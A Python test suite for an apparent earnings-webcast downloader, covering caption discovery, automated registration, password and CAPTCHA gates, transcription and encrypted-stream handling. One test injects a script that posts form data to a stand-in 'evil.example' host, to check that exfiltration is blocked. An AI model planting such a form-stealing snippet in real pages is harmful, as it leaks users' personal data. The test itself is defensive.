import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch,AsyncMock
from qualitative_ir_downloader.browser import Browser
from qualitative_ir_downloader.config import Config
from qualitative_ir_downloader.events_config import EventConfig,RegistrationProfile
from qualitative_ir_downloader.event_models import Event
from qualitative_ir_downloader.models import Stock,CollectionError
from qualitative_ir_downloader.registration import register
from qualitative_ir_downloader.webcast_providers.generic import GenericWebcastAdapter
from qualitative_ir_downloader.events import EventProcessor
from qualitative_ir_downloader.manifest import Manifest
FIX=Path(__file__).parents[1]/'fixtures'/'events'

class EventBrowserTests(unittest.IsolatedAsyncioTestCase):
    async def test_caption_player_is_identical_across_modes(self):
        from dataclasses import replace
        from types import SimpleNamespace
        from qualitative_ir_downloader.event_outcomes import metrics
        def stamp(t):return f"00:{t//60:02}:{t%60:02}.000"
        payload=("WEBVTT\n\n"+"\n\n".join(f"{stamp(i*24)} --> {stamp(i*24+25)}\nFixture passage {i} documents a synthetic earnings webinar for caption integration testing. It is not actual company speech." for i in range(25))).encode()
        source="https://media.example.com/zoom.vtt"
        async def player(route):
            await route.fulfill(content_type='text/html',body=f'<html><title>Zoom fixture webinar</title><video><track kind="captions" src="{source}"></video><script>Object.defineProperty(document.querySelector("video"),"duration",{{value:601}});</script></html>')
        await self.context.route('https://player.example.com/caption-webinar',player)
        discoveries=[]
        for generated in (False,True):
            self.browser.config=replace(self.browser.config,events=EventConfig(force=True,only=True,generated_only=generated))
            stock=Stock('ZM','Zoom','Safe',6)
            folder=self.folder/str(generated);(folder/'Events').mkdir(parents=True)
            manifest=Manifest(folder,stock,'test')
            event=Event('Zoom Second Quarter Fiscal Year 2027 Earnings Webinar','2026-08-24','https://ir.example.com/zoom-q2',webcast_url='https://player.example.com/caption-webinar')
            with patch('qualitative_ir_downloader.events.EventProcessor.search_official_transcript',AsyncMock(return_value=None)),patch('qualitative_ir_downloader.events.ResourceClient') as client,patch('qualitative_ir_downloader.events.transcribe') as whisper:
                client.return_value.get=AsyncMock(return_value=SimpleNamespace(body=payload,url=source))
                await EventProcessor(self.browser,self.context,stock,folder,manifest).process(event)
                whisper.assert_not_called()
            discoveries.append((event.title,event.provider,event.official_captions_url,event.caption_format,event.duration_seconds))
            self.assertEqual(event.status,'SKIPPED_OFFICIAL_CAPTIONS' if generated else 'TRANSCRIBED')
            count=metrics([event],[event],generated)
            self.assertEqual(count['official_captions_discovered'],1)
            self.assertEqual(count['official_captions_saved'],int(not generated))
            self.assertEqual(count['generated_transcript_created'],0)
        self.assertEqual(discoveries[0],discoveries[1])

    async def asyncSetUp(self):
        self.temp=tempfile.TemporaryDirectory();self.folder=Path(self.temp.name)
        (self.folder/'Events').mkdir()
        self.browser=await Browser(Config(download_root=self.folder,request_delay=0,navigation_timeout_ms=3000,events=EventConfig(model='small',approved_registration_domains=('example.com',),min_transcript_segments=2,min_transcript_characters=100))).__aenter__()
        self.session=self.browser.session();self.context=await self.session.__aenter__()
        self.context._approved_registration_domains=("example.com",)
        async def route(r):
            name='registration.html' if '/register' in r.request.url else 'iframe.html' if '/iframe' in r.request.url else 'player.html'
            if 'media.example.com' in r.request.url:await r.fulfill(status=404);return
            await r.fulfill(content_type='text/html',body=(FIX/name).read_text())
        await self.context.route('**/*',route)
        self.reg_requests=[]
        async def response(route,**kwargs):
            from types import SimpleNamespace
            self.reg_requests.append((kwargs['url'],kwargs.get('post_data')))
            return SimpleNamespace(status=200,headers={'content-type':'text/html'},body=AsyncMock(return_value=(FIX/'player.html').read_bytes()))
        self.registration_transport=patch('qualitative_ir_downloader.registration.registration_response',side_effect=response)
        self.fetch=self.registration_transport.start()

    async def asyncTearDown(self):
        self.registration_transport.stop()
        await self.session.__aexit__(None,None,None);await self.browser.__aexit__(None,None,None);self.temp.cleanup()
    async def test_registration_fields_and_optional_consent(self):
        page=await self.context.new_page();await page.goto('https://player.example.com/register')
        event=Event('Call','2026-08-05','https://ir.acme.com/e')
        captured={}
        async def inspect(r):
            from urllib.parse import parse_qs,urlsplit
            captured.update(parse_qs(urlsplit(r.request.url).query));await r.fulfill(body=(FIX/'player.html').read_text(),content_type='text/html')
        await self.context.route('**/player?*',inspect)
        self.assertTrue(await register(page,RegistrationProfile(),event,set()))
        from urllib.parse import parse_qs,urlsplit
        captured=parse_qs(urlsplit(self.reg_requests[0][0]).query)
        self.assertEqual(captured['given'],['Nicholas']);self.assertEqual(captured['family'],['Allen']);self.assertEqual(captured['role'],['other']);self.assertNotIn('marketing',captured);self.assertIn('terms',captured)
    async def test_iframe_audio(self):
        page=await self.context.new_page();await page.goto('https://player.example.com/iframe');await page.wait_for_timeout(200)
        candidates=await GenericWebcastAdapter().discover_media(page)
        self.assertTrue(any(c.media_type=='audio' for c in candidates))
    async def test_password_gate(self):
        page=await self.context.new_page();await page.set_content('<form><input type="password"></form>')
        with self.assertRaises(CollectionError) as cm:await register(page,RegistrationProfile(),Event('Call',None,'https://ir.acme.com/e'),set())
        self.assertEqual(cm.exception.code,'AUTH_REQUIRED')
    async def test_captcha_gate(self):
        page=await self.context.new_page();await page.set_content('<div class="g-recaptcha" style="width:100px;height:100px">CAPTCHA</div>')
        with self.assertRaises(CollectionError) as cm:await register(page,RegistrationProfile(),Event('Call',None,'https://ir.acme.com/e'),set())
        self.assertEqual(cm.exception.code,'CAPTCHA_REQUIRED')
    async def test_pipeline_preserves_json_and_cleans_media(self):
        stock=Stock('ACME','Acme','Safe',4);manifest=Manifest(self.folder,stock,'test')
        event=Event('Acme Q2 Call','2026-08-05','https://ir.acme.com/e',webcast_url='https://player.example.com/register')
        async def acquire(acquirer,candidate):
            audio=acquirer.folder/'normalized.wav';audio.write_bytes(b'fixture');return audio,{'duration':600}
        def transcript(audio,config,event,checkpoint,cancel=None):
            event.transcription_engine='faster-whisper';event.transcription_model='small';event.language='en'
            return [{'start':0,'end':10,'text':'Welcome to the Acme financial results call. Revenue was $25 million.'},{'start':590,'end':600,'text':'This concludes the questions and answers. Thank you for joining.'}]
        with patch('qualitative_ir_downloader.events.MediaAcquirer.acquire',acquire),patch('qualitative_ir_downloader.events.transcribe',transcript):
            await EventProcessor(self.browser,self.context,stock,self.folder,manifest).process(event)
        self.assertEqual(event.status,'TRANSCRIBED');self.assertTrue((self.folder/event.local_pdf).exists());self.assertTrue((self.folder/event.local_json).exists());self.assertIsNone(event.retained_media)
        self.assertFalse(list((self.folder/'Events'/'.temp').glob('*')))
        again=Event('Acme Q2 Call','2026-08-05','https://ir.acme.com/e',webcast_url='https://player.example.com/register')
        with patch('qualitative_ir_downloader.events.transcribe') as never:
            await EventProcessor(self.browser,self.context,stock,self.folder,manifest).process(again)
            never.assert_not_called()
        self.assertTrue(again.resumed)
        from qualitative_ir_downloader.events import completed_match
        again.media_url='https://media.example.com/replacement.mp3'
        self.assertIsNone(completed_match(again,self.folder,stock,config=self.browser.config.events))
        again.media_url=None;again.date='2026-08-06'
        self.assertIsNone(completed_match(again,self.folder,stock,config=self.browser.config.events))
        from dataclasses import replace
        self.browser.config=replace(self.browser.config,events=replace(self.browser.config.events,force=True))
        forced=Event('Acme Q2 Call','2026-08-05','https://ir.acme.com/e',webcast_url='https://player.example.com/register')
        with patch('qualitative_ir_downloader.events.MediaAcquirer.acquire',acquire),patch('qualitative_ir_downloader.events.transcribe',side_effect=transcript) as forced_transcribe:
            await EventProcessor(self.browser,self.context,stock,self.folder,manifest).process(forced)
            self.assertEqual(forced_transcribe.call_count,1)


    async def test_actual_xhr_destination_is_blocked_before_profile_leaves(self):
        page=await self.context.new_page();await page.goto('https://player.example.com/register')
        await page.evaluate("""() => {let f=document.querySelector('form');f.addEventListener('submit',e=>{e.preventDefault();fetch('https://media-server.com.evil.example/submit',{method:'POST',body:new URLSearchParams(new FormData(f))}).catch(()=>{});});}""")
        event=Event('Call',None,'https://ir.acme.com/e')
        received=[]
        async def capture(route):
            received.append(route.request.post_data);await route.fulfill(body='unexpected')
        await self.context.route('https://media-server.com.evil.example/**',capture)
        with self.assertRaises(CollectionError) as cm:await register(page,RegistrationProfile(),event,set())
        self.assertEqual(cm.exception.code,'REGISTRATION_APPROVAL_REQUIRED')
        self.assertFalse(received)
        self.assertEqual(event.errors[-1]['stage'],'submission_destination')

    async def test_redirected_post_cannot_forward_profile_to_unapproved_domain(self):
        page=await self.context.new_page();await page.goto('https://player.example.com/register')
        await page.locator('form').evaluate("e=>e.method='post'")
        received=[]
        async def redirect(route):
            await route.fulfill(status=307,headers={'location':'https://unapproved.example/registration'})
        async def capture(route):
            received.append(route.request.post_data);await route.fulfill(body='unexpected')
        from types import SimpleNamespace
        self.fetch.side_effect=lambda *a,**k: SimpleNamespace(status=307,headers={'location':'https://unapproved.example/registration'})
        await self.context.route('**/player',redirect)
        await self.context.route('https://unapproved.example/**',capture)
        event=Event('Call',None,'https://ir.acme.com/e')
        try:await register(page,RegistrationProfile(),event,set())
        except Exception:pass
        self.assertFalse(received)
        self.assertEqual(event.registration_status,'REGISTRATION_APPROVAL_REQUIRED')

    async def test_destination_discovery_never_fills_or_submits(self):
        from qualitative_ir_downloader.registration import discover_destination
        page=await self.context.new_page();await page.goto('https://player.example.com/register')
        event=Event('Call',None,'https://ir.acme.com/e')
        result=await discover_destination(page,event)
        self.assertEqual(result['domain'],'example.com')
        self.assertFalse(event.submission_attempted)
        self.assertEqual(await page.locator('input[type=email]').input_value(),'')
        self.assertFalse(await page.locator('input[name=terms]').is_checked())

    async def test_registered_encrypted_hls_preserves_protection(self):
        from qualitative_ir_downloader.event_outcomes import company_outcome
        async def player(route):
            await route.fulfill(content_type='text/html',body='<html><title>Replay</title><audio src="https://media.example.com/replay.m3u8"></audio></html>')
        from types import SimpleNamespace
        self.fetch.side_effect=lambda *a,**k: SimpleNamespace(status=200,headers={'content-type':'text/html'},body=AsyncMock(return_value=b'<html><title>Replay</title><audio src="https://media.example.com/replay.m3u8"></audio></html>'))
        await self.context.route('**/player?*',player)
        async def encrypted(acquirer,url,target,referer='',headers=None,limit=None):
            self.assertTrue(url.endswith('.m3u8'))
            target.write_text('#EXTM3U\n#EXT-X-KEY:METHOD=AES-128,URI="never-fetch-key"\n#EXT-X-ENDLIST')
            return url,'application/vnd.apple.mpegurl'
        stock=Stock('EXEL','Exelixis','Safe',4)
        event=Event('Q2 Financial Results','2026-08-05','https://ir.exelixis.com/events/q2',webcast_url='https://player.example.com/register')
        manifest=Manifest(self.folder,stock,'test')
        with patch('qualitative_ir_downloader.events.EventProcessor.search_official_transcript',AsyncMock(return_value=None)),patch('qualitative_ir_downloader.events.MediaAcquirer.fetch',encrypted),patch('qualitative_ir_downloader.events.transcribe') as whisper:
            with self.assertRaises(CollectionError):await EventProcessor(self.browser,self.context,stock,self.folder,manifest).process(event)
            whisper.assert_not_called()
        self.assertEqual(event.registration_status,'COMPLETED')
        self.assertEqual(event.protected_media_type,'encrypted HLS')
        event.transition('SITE_BLOCKED')
        self.assertEqual(company_outcome([event],'SITE_BLOCKED'),'EVENT_MEDIA_PROTECTED')
